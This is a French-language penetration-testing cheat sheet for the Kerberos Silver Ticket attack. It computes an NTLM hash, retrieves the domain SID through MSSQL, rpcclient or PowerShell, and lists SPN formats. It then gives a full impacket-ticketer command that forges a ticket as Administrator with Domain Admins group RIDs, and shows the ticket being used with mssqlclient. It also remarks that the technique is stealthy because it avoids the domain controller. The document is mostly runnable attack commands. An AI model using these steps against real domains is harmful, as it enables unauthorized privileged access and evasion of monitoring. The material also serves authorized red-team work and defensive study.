# Silver Ticket

Forge d'un ticket TGS Kerberos pour accéder à un service spécifique sans contacter le DC.

## Prérequis

- Hash NTLM du compte de service
- Domain SID
- Service Principal Name (SPN)

## Énumération

### 1. Calculer le hash NTLM du mot de passe

```bash
python3 -c 'import hashlib; print(hashlib.new("md4", "PASSWORD".encode("utf-16le")).hexdigest())'
```

### 2. Obtenir le Domain SID

```sql
# Via MSSQL
SELECT SUSER_SID();

# Convertir hex en SID lisible
# 0x0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000
# → S-1-5-21-4089266779-1167590040-2748827309-1103
# Domain SID: S-1-5-21-4089266779-1167590040-2748827309
```

```bash
# Via rpcclient
rpcclient -U "user%password" <DC_IP>
rpcclient $> lsaquery
```

```powershell
# Via PowerShell
(Get-ADDomain).DomainSID.Value
```

### 3. Identifier les groupes privilégiés

```sql
# Récupérer le RID d'un groupe
SELECT SUSER_SID('DOMAIN\GroupName');
```

### 4. Construire le SPN

| Service | Format |
|---------|--------|
| MSSQL | `MSSQLSvc/hostname.domain.com:1433` |
| CIFS | `cifs/hostname.domain.com` |
| HTTP | `HTTP/hostname.domain.com` |
| LDAP | `ldap/hostname.domain.com` |

## Exploitation

### Générer le ticket

```bash
impacket-ticketer \
  -nthash <NTLM_HASH> \
  -domain-sid <DOMAIN_SID> \
  -domain <DOMAIN> \
  -spn <SPN> \
  -groups <GROUP_RIDs> \
  -user-id <USER_RID> \
  <USERNAME>
```

**Exemple:**
```bash
impacket-ticketer \
  -nthash a1b2c3d4e5f6... \
  -domain-sid "S-1-5-21-123456789-123456789-123456789" \
  -domain CORP.LOCAL \
  -spn MSSQLSvc/sql01.corp.local:1433 \
  -groups 512,1105 \
  -user-id 500 \
  Administrator
```

### Utiliser le ticket

```bash
export KRB5CCNAME=$(pwd)/Administrator.ccache
mssqlclient.py -k -no-pass hostname.domain.com
```

## RIDs importants

| RID | Nom |
|-----|-----|
| 500 | Administrator |
| 512 | Domain Admins |
| 519 | Enterprise Admins |
| 544 | Administrators (local) |

## Notes

- Pas de communication avec le DC (stealthy)
- Valide tant que le compte de service existe
- Le groupe RID doit avoir les permissions sur le service ciblé
